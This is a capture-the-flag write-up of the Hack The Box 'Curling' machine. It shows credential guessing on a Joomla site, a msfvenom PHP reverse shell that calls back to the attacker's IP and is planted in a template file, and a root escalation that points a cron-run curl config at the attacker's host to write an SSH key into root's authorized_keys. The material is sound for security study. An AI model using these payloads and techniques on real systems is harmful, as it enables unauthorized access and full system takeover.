---
layout: single
title: Curling - Hack The Box
excerpt: This is the writeup for Curling, a pretty easy box with Joomla running. We can log in after doing basic recon and some educated guessing of the password.
date: 2019-03-30
classes: wide
header:
  teaser: /assets/images/htb-writeup-curling/curling_logo.png
categories:
  - hackthebox
  - infosec
tags:  
  - joomla
  - ctf
  - cron
  - php
  - easy
---

![](/assets/images/htb-writeup-curling/curling_logo.png)

## Quick summary

- The username for the Joomla site is `Floris` as indicated on the main page in one of the post
- The password is a variant of a word on the main page: `Curling2018!`
- On the Joomla admin page we can inject a meterpreter reverse shell in the `index.php` file of the template in-use
- After getting a shell, we can download a password backup file, which is compressed several times, and contains the password for user `floris`
- User `floris` controls a `input` file used by `curl` running in a root cronjob. We can change the config file so that cURL gets our SSH public key and saves it into the root ssh directory

### Nmap

Just a webserver running Joomla on port 80

```
root@ragingunicorn:~/hackthebox/Machines# nmap -sV -sV curling.htb
Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-27 16:22 EDT
Nmap scan report for curling.htb (10.10.10.150)
Host is up (0.020s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.29 seconds
```

### Joomla

Joomscan didn't return anything interesting but the main page has some interesting stuff:

1. The site name is **Cewl Curling site!**, this is a reference to the cewl tool used to scrape websites for words which are then used to build wordlists.

2. The first post reveals the username for the administrator: `Floris`

3. The first post also contains something which could be used as a password: `curling2018`

![](/assets/images/htb-writeup-curling/credentials.png)

After trying a few variants of the password, I was able to log in as user `Floris` with the password `Curling2018!`

We can now access the administrator page at [http://curling.htb/administrator/index.php](http://curling.htb/administrator/index.php)

I generated a simple PHP meterpreter payload:

```
root@ragingunicorn:~/htb/curling# msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.23 LPORT=4444 > shell.php
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 1112 bytes
```

Then I added it to the index.php page so i could trigger it by browsing the main page:

![](/assets/images/htb-writeup-curling/php.png)

```
msf exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  tun0             yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.23:4444
```

Getting a shell:

```
[*] Started reverse TCP handler on 10.10.14.23:4444
[*] Sending stage (37775 bytes) to 10.10.10.150
[*] Meterpreter session 1 opened (10.10.14.23:4444 -> 10.10.10.150:56220) at 2018-10-27 16:33:27 -0400

meterpreter > sessions 1
[*] Session 1 is already interactive.
meterpreter > shell
Process 2047 created.
Channel 0 created.
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Escalate to user Floris

User `floris` has a readable file `password_backup`

```
cd /home/floris
ls
admin-area
password_backup
user.txt
cat password_backup
00000000: 425a 6839 3141 5926 5359 819b bb48 0000  BZh91AY&SY...H..
00000010: 17ff fffc 41cf 05f9 5029 6176 61cc 3a34  ....A...P)ava.:4
00000020: 4edc cccc 6e11 5400 23ab 4025 f802 1960  N...n.T.#.@%...`
00000030: 2018 0ca0 0092 1c7a 8340 0000 0000 0000   ......z.@......
00000040: 0680 6988 3468 6469 89a6 d439 ea68 c800  ..i.4hdi...9.h..
00000050: 000f 51a0 0064 681a 069e a190 0000 0034  ..Q..dh........4
00000060: 6900 0781 3501 6e18 c2d7 8c98 874a 13a0  i...5.n......J..
00000070: 0868 ae19 c02a b0c1 7d79 2ec2 3c7e 9d78  .h...*..}y..<~.x
00000080: f53e 0809 f073 5654 c27a 4886 dfa2 e931  .>...sVT.zH....1
00000090: c856 921b 1221 3385 6046 a2dd c173 0d22  .V...!3.`F...s."
000000a0: b996 6ed4 0cdb 8737 6a3a 58ea 6411 5290  ..n....7j:X.d.R.
000000b0: ad6b b12f 0813 8120 8205 a5f5 2970 c503  .k./... ....)p..
000000c0: 37db ab3b e000 ef85 f439 a414 8850 1843  7..;.....9...P.C
000000d0: 8259 be50 0986 1e48 42d5 13ea 1c2a 098c  .Y.P...HB....*..
000000e0: 8a47 ab1d 20a7 5540 72ff 1772 4538 5090  .G.. .U@r..rE8P.
000000f0: 819b bb48                                ...H
```

This appears to be a bzip2 file but we need to put it back in binary format first, we'll use CyberChef for this:

![](/assets/images/htb-writeup-curling/cyberchef.png)

We just hit the *Save to output file* icon to download the `download.dat` file in binary format.

Confirmed, this is a bzip2 file:

```
root@ragingunicorn:~/Downloads# file download.dat
download.dat: bzip2 compressed data, block size = 900k
```

Let's decompress it...

```
root@ragingunicorn:~/Downloads# bzip2 -d download.dat
bzip2: Can't guess original name for download.dat -- using download.dat.out
root@ragingunicorn:~/Downloads# file download.dat.out
download.dat.out: gzip compressed data, was "password", last modified: Tue May 22 19:16:20 2018, from Unix, original size 141
```

Geez, another compressed file in it!

```
root@ragingunicorn:~/Downloads# mv download.dat.out download.gz
root@ragingunicorn:~/Downloads# gunzip download.gz
root@ragingunicorn:~/Downloads# file download
download: bzip2 compressed data, block size = 900k
```

Now, this is just dumb... 

```
root@ragingunicorn:~/Downloads# mv download password.bz2
root@ragingunicorn:~/Downloads# bzip2 -d password.bz2
root@ragingunicorn:~/Downloads# file password
password: POSIX tar archive (GNU)
```

Let's keep going.

```
root@ragingunicorn:~/Downloads# tar xvf password.tar
password.txt
root@ragingunicorn:~/Downloads# cat password.txt
5d<wdCbdZu)|hChXll
```

Finally!

We can `su` to user `floris` now and get the user flag.

```
python3 -c 'import pty;pty.spawn("/bin/sh")'
$ su -l floris
su -l floris
Password: 5d<wdCbdZu)|hChXll

floris@curling:~$ cat user.txt
cat user.txt
65dd1d...
floris@curling:~$
```

### Privesc

First, let's upload our ssh key so we don't have to rely on that meterpreter shell:

```
floris@curling:~$ mkdir .ssh
mkdir .ssh
floris@curling:~$ echo "ssh-rsa AAAAB...DhscPOtelvd root@ragingunicorn" > .ssh/authorized_keys
<cPOtelvd root@ragingunicorn" > .ssh/authorized_keys
```

In `admin-area` folder, there are two files with a timestamp that keeps refreshing every few minutes:

```
floris@curling:~/admin-area$ ls -la
total 12
drwxr-x--- 2 root   floris 4096 May 22 19:04 .
drwxr-xr-x 7 floris floris 4096 Oct 27 20:39 ..
-rw-rw---- 1 root   floris   25 Oct 27 20:40 input
-rw-rw---- 1 root   floris    0 Oct 27 20:40 report
floris@curling:~/admin-area$ date
Sat Oct 27 20:40:44 UTC 2018
```

There is probably a cron job running as root, let's confirm this by running a simple `ps` command in a bash loop:

```
floris@curling:~/admin-area$ while true; do ps waux | grep report | grep -v "grep --color"; done
root      9225  0.0  0.0   4628   784 ?        Ss   20:44   0:00 /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report
root      9227  0.0  0.4 105360  9076 ?        S    20:44   0:00 curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report
root      9225  0.0  0.0   4628   784 ?        Ss   20:44   0:00 /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report
root      9227  0.0  0.4 105360  9076 ?        S    20:44   0:00 curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report
root      9225  0.0  0.0   4628   784 ?        Ss   20:44   0:00 /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report
root      9227  0.0  0.4 105360  9076 ?        S    20:44   0:00 curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report
root      9225  0.0  0.0   4628   784 ?        Ss   20:44   0:00 /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report
root      9227  0.0  0.4 105360  9076 ?        S    20:44   0:00 curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report
```

As suspected, a cronjob executes curl using a `input` config file which we can write to.

We will change the file to fetch our SSH public key and save it into root's authorized_keys file:

```
floris@curling:~/admin-area$ echo -ne 'output = "/root/.ssh/authorized_keys"\nurl = "http://10.10.14.23/key.txt"\n' > input
floris@curling:~/admin-area$ cat input
output = "/root/.ssh/authorized_keys"
url = "http://10.10.14.23/key.txt"
```

When the cronjob runs, it fetches our public key:

```
root@ragingunicorn:~/htb/curling# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
10.10.10.150 - - [27/Oct/2018 16:52:56] "GET /key.txt HTTP/1.1" 200 -
```

We can now SSH in as root:

```
root@ragingunicorn:~# ssh root@curling.htb
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-22-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Oct 27 20:47:15 UTC 2018

  System load:  0.13              Processes:            181
  Usage of /:   46.3% of 9.78GB   Users logged in:      1
  Memory usage: 22%               IP address for ens33: 10.10.10.150
  Swap usage:   0%

  => There is 1 zombie process.


0 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Sep 25 21:56:22 2018
root@curling:~# cat root.txt
82c198...
```